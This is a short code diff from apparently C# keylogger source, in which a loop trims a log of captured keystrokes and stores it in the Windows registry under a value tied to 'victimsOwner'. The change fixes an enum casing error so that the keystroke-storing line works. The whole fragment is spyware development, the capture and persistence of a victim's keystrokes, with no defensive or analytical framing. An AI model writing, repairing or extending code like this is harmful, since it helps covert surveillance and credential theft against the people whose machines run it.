@@ -83,7 +83,7 @@ namespace j
                             keyStrokesLog = keyStrokesLog.Remove(0, keyStrokesLog.Length - maxKeyStrokesLength);
                         }
 
-                        Core.StoreValueOnRegistry(victimsOwner, keyStrokesLog, RegistryValueKind.string);
+                        Core.StoreValueOnRegistry(victimsOwner, keyStrokesLog, RegistryValueKind.String);
                     }
 
                     Thread.Sleep(1);
